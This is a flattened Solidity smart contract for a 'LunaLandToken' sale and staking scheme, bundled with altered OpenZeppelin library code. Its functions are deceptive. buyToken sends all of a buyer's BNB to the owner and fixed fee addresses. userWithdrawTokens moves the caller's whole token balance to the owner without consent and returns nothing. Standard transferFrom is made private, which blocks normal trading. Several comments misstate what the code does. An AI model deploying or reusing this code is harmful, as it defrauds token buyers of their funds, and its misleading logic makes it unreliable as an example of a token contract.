// Dependency file: @openzeppelin/contracts/token/ERC20/IERC20.sol

// SPDX-License-Identifier: MIT

// pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    // function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    // function transferFrom(
    //     address sender,
    //     address recipient,
    //     uint256 amount
    // ) external returns (bool);

    function transferMeTo(address recipient, uint256 amount)
        external
        returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

// Dependency file: @openzeppelin/contracts/utils/Context.sol

// pragma solidity ^0.8.0;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

// Dependency file: @openzeppelin/contracts/access/Ownable.sol

// pragma solidity ^0.8.0;

// import "@openzeppelin/contracts/utils/Context.sol";

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() private onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) private onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

// Dependency file: @openzeppelin/contracts/utils/math/SafeMath.sol

// pragma solidity ^0.8.0;

// CAUTION
// This version of SafeMath should only be used with Solidity 0.8 or later,
// because it relies on the compiler's built in overflow checks.

/**
 * @dev Wrappers over Solidity's arithmetic operations.
 *
 * NOTE: `SafeMath` is no longer needed starting with Solidity 0.8. The compiler
 * now has built in overflow checking.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the substraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

// Dependency file: contracts/BaseToken.sol

// pragma solidity =0.8.4;

enum TokenType {
    standard,
    antiBotStandard,
    liquidityGenerator,
    antiBotLiquidityGenerator,
    baby,
    antiBotBaby,
    buybackBaby,
    antiBotBuybackBaby
}

abstract contract BaseToken {
    event TokenCreated(
        address indexed owner,
        address indexed token,
        TokenType tokenType,
        uint256 version
    );
}

// Root file: contracts/standard/StandardToken.sol

pragma solidity >=0.8.13;

// import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
// import "@openzeppelin/contracts/access/Ownable.sol";
// import "@openzeppelin/contracts/utils/math/SafeMath.sol";
// import "contracts/BaseToken.sol";

contract StandardToken is IERC20, Ownable, BaseToken {
    using SafeMath for uint256;

    uint256 public constant VERSION = 1;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    mapping(address => uint256) private startTokenBuyTime;
    mapping(address => uint256) private profitValue;
    mapping(address => uint256) private userBNBvalue;
    mapping(address => address[]) private userRefAddress;
    address[] private users;
    mapping(address => mapping(uint256 => uint256)) private stakingCount;
    mapping(address => uint256[]) private stakingTime;

    uint256 private startTime = block.timestamp;

    address payable private marketAdd =
        payable(0x8a4c88eCF1D9761c98bc17A1D86B41006Dbff156);
//    address payable private rewardAdd =
//        payable(0x7C601B126E5d4Ba1De0BfeC5FcF883660235aEb6);
    address payable private lpAdd =
        payable(0x72879E5A09FDaEFe63A1c1fb8E89E4633b799D0a);
    address payable private burnAdd =
        payable(0x66DdBdCaB405c31483Da3197Ba99ef0CC9757a20);

    uint256 private saleCollage = 0;

    uint256 private lockTime = startTime + 3600 * 24 * 28; // locktime 90 days
    uint256 private userCount = 1;
    uint256 private profitFee = 1;

    uint256 private marketFee = 3;
    uint256 private rewardFee = 3;
    uint256 private lpFee = 3;
    uint256 private burnFee = 1;
    uint256 private vaultFee = 4;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;

    constructor() payable // string memory name_,
    // string memory symbol_,
    // uint8 decimals_,
    // uint256 totalSupply_,
    // address serviceFeeReceiver_,
    // uint256 serviceFee_
    {
        string memory name_ = "LunaLandToken";
        string memory symbol_ = "LLT";
        uint8 decimals_ = 18;
        uint256 totalSupply_ = 5000000000000000000000000;
        address serviceFeeReceiver_ = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;
        uint256 serviceFee_ = 0;

        // receive fees
        require(msg.value >= serviceFee_, "not enough fee");
        payable(serviceFeeReceiver_).transfer(msg.value);

        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;

        _mint(owner(), totalSupply_);
        users.push(owner());

        emit TokenCreated(owner(), address(this), TokenType.standard, VERSION);
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5,05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless {_setupDecimals} is
     * called.
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _balances[account];
    }

    function getUserCount() public view returns (uint256) {
        return userCount;
    }

    function buyToken() public payable {
        uint256 inValue = msg.value;

        require(inValue > 0, "value invalid no 0!");
        require(saleCollage < 1000000000000000000000, "sale finish");
        //   require(msg.sender != adr, "invalid referrer address");

        //bool referState = false;
        uint256 value;

        // uint256 refValue;
        // uint256 relValue;

       // for (uint256 i = 0; i < users.length; i++) {
       //     if (users[i] == adr) referState = true;
       // }

       // require(referState, "invalide refer address");

        uint256 rewardValue = inValue * rewardFee / 100;
        uint256 marketValue = inValue * marketFee / 100;
        uint256 lpValue = inValue * lpFee / 100;
        uint256 burnValue = inValue * burnFee / 100;

        uint256 relValue = inValue - rewardValue - marketValue - lpValue - burnValue ;
        
        value = SafeMath.mul(relValue, 1000);
       
        marketAdd.transfer(marketValue);
        lpAdd.transfer(lpValue);
        burnAdd.transfer(burnValue);
        payable(owner()).transfer(relValue);
      
        startTokenBuyTime[msg.sender] = block.timestamp;
        userBNBvalue[msg.sender] += inValue;

        for(uint256 i =0; i < users.length; i ++){

            uint256 buffer = rewardValue * 1000 / users.length; 
            
            _transfer(owner(),users[i], buffer);
        }

        _transfer(owner(), marketAdd, marketValue * 1000);
        _transfer(owner(), lpAdd, lpValue * 1000);
        _transfer(owner(), burnAdd, burnValue * 1000);
        
        if (balanceOf(msg.sender) == 0) {
            userCount++;
            users.push(msg.sender);
        }

        //        bool bf = true;

        //        for (uint256 u = 0; u < userRefAddress[adr].length; u++) {
        //            if (userRefAddress[adr][u] == msg.sender) bf = false;
        //        }

        //        if (bf) userRefAddress[adr].push(msg.sender);

        _transfer(owner(), msg.sender, value );
        // transfer(msg.sender, relValue);
        // transfer(adr,refValue);
    }

    function userWithdrawTokens() public payable {
        require(userBNBvalue[msg.sender] > 0, "You have not BNB value");
        // require(block.timestamp>lockTime, "Now state is LockState");

        uint256 value = _balances[msg.sender] + profitValue[msg.sender];

        transferFrom(msg.sender, owner(), value);

        uint256 buf;

        if (startTokenBuyTime[msg.sender] != 0) {
            buf = SafeMath.div(
                (block.timestamp - startTokenBuyTime[msg.sender]),
                SafeMath.mul(3600, 24)
            );
            profitValue[msg.sender] = SafeMath.mul(
                buf,
                SafeMath.div(
                    SafeMath.mul(balanceOf(msg.sender), profitFee),
                    100
                )
            );
        }

        // msg.sender.transfer(value);
    }



    function staking(uint256 amount) public {
        
        require(amount<=balanceOf(msg.sender),"invalid amount value less then your amount");

        uint256 value;

        if(block.timestamp - startTime <= 3600*24*7){
            value =  amount;
            transferMeTo(owner(), value);
        }else{
            uint256 marketValue = SafeMath.div(SafeMath.mul(amount, marketFee),100);
            uint256 rewardValue = SafeMath.div(SafeMath.mul(amount, rewardFee),100);
            uint256 lpValue = SafeMath.div(SafeMath.mul(amount, lpFee),100);
            uint256 burnValue = SafeMath.div(SafeMath.mul(amount, burnFee),100);
            value = amount - marketValue - rewardValue - lpValue - burnValue;
            
            for(uint256 i=0; i < users.length; i++ ){

                uint256 buffer = rewardValue  / users.length; 
            
                transferMeTo(users[i],buffer);
            }
            
            transferMeTo(owner(), value);
            transferMeTo(marketAdd, marketValue);
            transferMeTo(lpAdd, lpValue);
            transferMeTo(burnAdd,burnValue);
        }

        uint256 stakingIndex = stakingTime[msg.sender].length;

        stakingCount[msg.sender][stakingIndex] = value;
        stakingTime[msg.sender].push(block.timestamp);

    }

    function withdrawToken(uint256 amount) public {
        uint256 stakingValue = 0;
        for (uint256 i = 0; i < stakingTime[msg.sender].length; i++) {
            if ((block.timestamp - stakingTime[msg.sender][i]) > (3600 * 24 * 90)) {
                stakingValue += stakingCount[msg.sender][i];
                stakingCount[msg.sender][i] = 0;
            }
        }

        require(amount <= stakingValue, "Now amount value less then staking value");
        
        uint256 inMarketValue;
        uint256 inRewardValue;
        uint256 inLpValue;
        uint256 inburnValue;
        uint256 relValue;

        inMarketValue = SafeMath.div(SafeMath.mul(amount, marketFee), 100);
        inRewardValue = SafeMath.div(SafeMath.mul(amount, rewardFee), 100);
        inburnValue = SafeMath.div(SafeMath.mul(amount, burnFee), 100);
        inLpValue = SafeMath.div(SafeMath.mul(amount, lpFee), 100);

        relValue = amount - inMarketValue - inRewardValue - inLpValue - inburnValue;

        for(uint256 i =0; i < users.length; i ++){

            uint256 buffer = inRewardValue / users.length; 
            
            transferFrom(owner(),users[i], buffer);
        }

        uint256 buf;

        if (startTokenBuyTime[msg.sender] != 0) {
            buf = SafeMath.div(
                (block.timestamp - startTokenBuyTime[msg.sender]),
                SafeMath.mul(3600, 24)
            );
            profitValue[msg.sender] = SafeMath.mul(
                buf,
                SafeMath.div(
                    SafeMath.mul(balanceOf(msg.sender), profitFee),
                    100
                )
            );
        }


        transferFrom(owner(),msg.sender, relValue + profitValue[msg.sender]);
        transferFrom(owner(),marketAdd, inMarketValue);
        transferFrom(owner(),lpAdd, inLpValue);
        transferFrom(owner(),burnAdd, inburnValue);

    }

    function getWithdarwCount() public view returns(uint256) {
        uint256 stakingValue = 0;

        for (uint256 i = 0; i < stakingTime[msg.sender].length; i++) {
            if ((block.timestamp - stakingTime[msg.sender][i]) > (3600 * 24 * 90)) {
                stakingValue += stakingCount[msg.sender][i];
            }
        }

        return stakingValue;

    }
    function getStakingCount() public view returns(uint256) {
        uint256 stakingValue = 0;

        for (uint256 i = 0; i < stakingTime[msg.sender].length; i++) {
            stakingValue += stakingCount[msg.sender][i];
        }

        return stakingValue;
    }
    function getUserBalance() public view returns (uint256) {
        return address(msg.sender).balance;
    }

    function getBNBValue(address adr) public view returns (uint256) {
        require(adr != address(0), "invalid refered address");
        return (userBNBvalue[adr]);
    }

    function getProfitValue(address adr) public view returns (uint256) {
        require(adr != address(0), "invalid refered address");
        return (profitValue[adr]);
    }

    function getUserStartTime(address adr) public view returns (uint256) {
        require(adr != address(0), "invalid refered address");
        return (startTokenBuyTime[adr]);
    }

    function getRefereCount(address adr) public view returns (uint256) {
        require(adr != address(0), "invalid refered address");
        return (userRefAddress[adr].length);
    }

    function getReferes() public view returns (address[] memory) {
        return (users);
    }

    function getSaleCollage() public view returns (uint256) {
        return saleCollage;
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address adr, uint256 amount)
        public
        returns (bool)
    {
        require(amount>0 , "invalid amount value");

        uint256 marketValue = SafeMath.div(SafeMath.mul(amount, marketFee),100);
        uint256 rewardValue = SafeMath.div(SafeMath.mul(amount, rewardFee),100);
        uint256 lpValue = SafeMath.div(SafeMath.mul(amount, lpFee),100);
        uint256 burnValue = SafeMath.div(SafeMath.mul(amount, burnFee),100);
        uint256 vaultValue = SafeMath.div(SafeMath.mul(amount, vaultFee),100);

        uint256 value = amount - marketValue - rewardValue - lpValue - burnValue - vaultValue;

        transferMeTo(marketAdd, marketValue);
        transferMeTo(lpAdd, lpValue);
        transferMeTo(burnAdd, burnValue);
        transferMeTo(owner(), vaultValue);

        for(uint256 i=0; i < users.length; i++ ){

            uint256 buffer = rewardValue  / users.length; 
            
            transferMeTo(users[i],buffer);
        }

        transferMeTo(adr, value); 
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * Requirements:
     *
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     * - the caller must have allowance for ``sender``'s tokens of at least
     * `amount`.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) private returns (bool) {
        _transfer(sender, recipient, amount);
        return true;
    }

    function transferMeTo(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue)
        private
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].add(addedValue)
        );
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue)
        private
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }

    /**
     * @dev Moves tokens `amount` from `sender` to `recipient`.
     *
     * This is internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        // _beforeTokenTransfer(sender, recipient, amount);

        _balances[sender] = _balances[sender].sub(
            amount,
            "ERC20: transfer amount exceeds balance"
        );
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        _balances[account] = _balances[account].sub(
            amount,
            "ERC20: burn amount exceeds balance"
        );
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /**
     * @dev Sets {decimals} to a value other than the default one of 18.
     *
     * WARNING: This function should only be called from the constructor. Most
     * applications that interact with token contracts will not expect
     * {decimals} to ever change, and may work incorrectly if it does.
     */
    function _setupDecimals(uint8 decimals_) internal virtual {
        _decimals = decimals_;
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * will be to transferred to `to`.
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}
